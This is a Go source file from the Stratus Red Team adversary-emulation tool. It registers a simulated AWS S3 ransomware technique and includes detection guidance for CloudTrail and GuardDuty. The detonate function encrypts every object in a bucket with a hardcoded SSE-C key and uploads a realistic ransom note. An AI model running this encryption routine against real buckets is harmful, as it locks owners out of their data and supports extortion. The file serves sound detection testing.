package aws

import (
	"context"
	_ "embed"
	"encoding/base64"
	"fmt"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"io"
	"log"
	"strconv"
	"strings"
)

//go:embed main.tf
var tf []byte

const RansomNoteFilename = `FILES-DELETED.txt`
const RansomNoteContents = `Your data is backed up in a safe location. To negotiate with us for recovery, get in touch with rick@astley.io. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable.'`

var EncryptionKey = "427fc7323cfb4b58f630789d372476fb"
var Base64EncodedEncryptionKey = base64.StdEncoding.EncodeToString([]byte(EncryptionKey))
var EncryptionKeyMD5 = utils.MD5HashBase64(EncryptionKey)

const CodeBlock = "```"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.impact.s3-ransomware-client-side-encryption",
		FriendlyName: "S3 Ransomware through client-side encryption",
		Description: `
Simulates S3 ransomware activity that encrypts files in a bucket with a static key, through S3 [client-side encryption](https://docs.aws.amazon.com/AmazonS3/latest/userguide/UsingClientSideEncryption.html) feature.
Warm-up: 

- Create an S3 bucket
- Create a number of files in the bucket, with random content and extensions

Detonation: 

- List all objects in the bucket
- Overwrite every file in the bucket with an encrypted version, using [S3 client-side encryption](https://docs.aws.amazon.com/AmazonS3/latest/userguide/UsingClientSideEncryption.html)
- Upload a ransom note to the bucket

References:

- https://www.firemon.com/what-you-need-to-know-about-ransomware-in-aws/
- https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/
- https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/
- https://unit42.paloaltonetworks.com/shinyhunters-ransomware-extortion/
`,
		Detection: `
You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or deleted in the bucket. 
In general, this can be done through [CloudTrail S3 data events](https://docs.aws.amazon.com/AmazonS3/latest/userguide/cloudtrail-logging-s3-info.html#cloudtrail-object-level-tracking) (<code>DeleteObject</code>, <code>DeleteObjects</code>, <code>GetObject</code>, <code>CopyObject</code>),
[CloudWatch metrics](https://docs.aws.amazon.com/AmazonS3/latest/userguide/metrics-dimensions.html#s3-request-cloudwatch-metrics) (<code>NumberOfObjects</code>),
or [GuardDuty findings](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html) (<code>[Exfiltration:S3/AnomalousBehavior](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html#exfiltration-s3-anomalousbehavior)</code>, <code>[Impact:S3/AnomalousBehavior.Delete](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html#impact-s3-anomalousbehavior-delete)</code>).

Sample CloudTrail event <code>CopyObject</code>, when a file is encrypted with a client-side key:

` + CodeBlock + `json hl_lines="3 9 11 12"
{
  "eventSource": "s3.amazonaws.com",
  "eventName": "CopyObject",
  "eventType": "AwsApiCall",
  "eventCategory": "Data",
  "managementEvent": false,
  "readOnly": false,
  "requestParameters": {
    "bucketName": "target bucket",
    "Host": "target bucket.s3.us-east-1.amazonaws.com",
    "x-amz-server-side-encryption-customer-algorithm": "AES256",
    "x-amz-copy-source": "target bucket/target file.txt",
    "key": "target file.txt",
    "x-id": "CopyObject"
  },
  "responseElements": {
    "x-amz-server-side-encryption-customer-algorithm": "AES256"
  },
  "resources": [
    {
      "type": "AWS::S3::Object",
      "ARN": "arn:aws:s3:::target bucket/target file.txt"
    },
    {
      "accountId": "012345678901",
      "type": "AWS::S3::Bucket",
      "ARN": "arn:aws:s3:::target bucket"
    }
  ]
}
` + CodeBlock + `
`,
		Platform:                   stratus.AWS,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert, // We need to decrypt files before cleaning up, otherwise Terraform can't delete them properly
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Simulating a ransomware attack on bucket " + bucketName)

	if err := utils.DownloadAllObjects(s3Client, bucketName); err != nil {
		return fmt.Errorf("failed to download bucket objects")
	}

	if err := encryptAllObjects(s3Client, bucketName); err != nil {
		return fmt.Errorf("failed to encrypt objects in the bucket: %w", err)
	}

	log.Println("Uploading fake ransom note")
	if err := utils.UploadFile(s3Client, bucketName, RansomNoteFilename, strings.NewReader(RansomNoteContents)); err != nil {
		return fmt.Errorf("failed to upload ransom note to the bucket: %w", err)
	}

	return nil
}

func encryptAllObjects(s3Client *s3.Client, bucketName string) error {
	objects, err := utils.ListAllObjectVersions(s3Client, bucketName)
	if err != nil {
		return fmt.Errorf("unable to list bucket objects: %w", err)
	}
	log.Println("Found " + strconv.Itoa(len(objects)) + " objects to encrypt")
	log.Println("Encrypting all objects one by one with the secret AES256 encryption key '" + EncryptionKey + "'")

	for _, object := range objects {
		_, err := s3Client.CopyObject(context.Background(), &s3.CopyObjectInput{
			Bucket:               &bucketName,
			Key:                  object.Key,
			CopySource:           aws.String(bucketName + "/" + *object.Key),
			SSECustomerKey:       aws.String(Base64EncodedEncryptionKey),
			SSECustomerAlgorithm: aws.String("AES256"),
			SSECustomerKeyMD5:    aws.String(EncryptionKeyMD5),
		})
		if err != nil {
			return fmt.Errorf("unable to encrypt file %s: %w", *object.Key, err)
		}
	}
	log.Println("Successfully encrypted all objects in the bucket")
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Decrypting all files in the bucket")
	if err := decryptAllObjects(s3Client, bucketName); err != nil {
		return fmt.Errorf("failed to decrypt objects in the bucket: %w", err)
	}

	return nil
}

func decryptAllObjects(s3Client *s3.Client, bucketName string) error {
	objects, err := utils.ListAllObjectVersions(s3Client, bucketName)
	if err != nil {
		return fmt.Errorf("unable to list bucket objects: %w", err)
	}
	log.Println("Found " + strconv.Itoa(len(objects)) + " objects to encrypt")
	log.Println("Decrypting all objects one by one with the secret AES256 encryption key '" + EncryptionKey + "'")

	for _, object := range objects {
		if *object.Key == RansomNoteFilename {
			// ignore the fake ransom note
			continue
		}
		result, err := s3Client.GetObject(context.Background(), &s3.GetObjectInput{
			Bucket:               &bucketName,
			Key:                  object.Key,
			SSECustomerKey:       aws.String(Base64EncodedEncryptionKey),
			SSECustomerAlgorithm: aws.String("AES256"),
			SSECustomerKeyMD5:    aws.String(EncryptionKeyMD5),
		})
		if err != nil {
			return fmt.Errorf("unable to decrypt file %s: %w", *object.Key, err)
		}

		_, err = s3Client.DeleteObject(context.Background(), &s3.DeleteObjectInput{
			Bucket: &bucketName,
			Key:    object.Key,
		})
		if err != nil {
			return fmt.Errorf("unable to delete encrypted file %s: %w", *object.Key, err)
		}
		fileContent, _ := io.ReadAll(result.Body)

		err = utils.UploadFile(s3Client, bucketName, *object.Key, strings.NewReader(string(fileContent)))
		if err != nil {
			return fmt.Errorf("unable to re-upload decrypted file %s: %w", *object.Key, err)
		}
	}
	log.Println("Successfully encrypted all objects in the bucket")
	return nil
}
